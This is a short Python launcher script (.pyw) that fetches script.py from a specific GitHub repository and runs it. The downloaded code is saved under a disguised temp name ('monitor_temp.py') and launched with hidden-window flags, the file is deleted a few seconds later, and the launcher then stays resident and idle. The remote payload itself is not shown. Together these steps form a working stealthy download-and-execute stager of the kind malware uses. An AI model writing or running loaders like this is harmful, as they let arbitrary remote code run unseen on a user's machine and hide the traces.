# github_launcher.pyw - Downloads and runs script.py from GitHub
import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import threading

def download_and_run():
    """Download script.py from GitHub and run it"""
    try:
        # GitHub URLs
        GITHUB_USERNAME = "ElianBoden"
        GITHUB_REPO = "Deployer"
        GITHUB_BRANCH = "main"
        
        SCRIPT_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}/script.py"
        
        # Download the script
        response = urllib.request.urlopen(SCRIPT_URL, timeout=10)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file
        temp_script = tempfile.gettempdir() + "/monitor_temp.py"
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Run hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Delete temp file after 5 seconds
        time.sleep(5)
        try:
            os.remove(temp_script)
        except:
            pass
        
        return True
        
    except Exception:
        return False

def main():
    """Main launcher function"""
    # Initial delay for network
    time.sleep(5)
    
    # Run the script
    download_and_run()
    
    # Keep launcher alive but idle
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
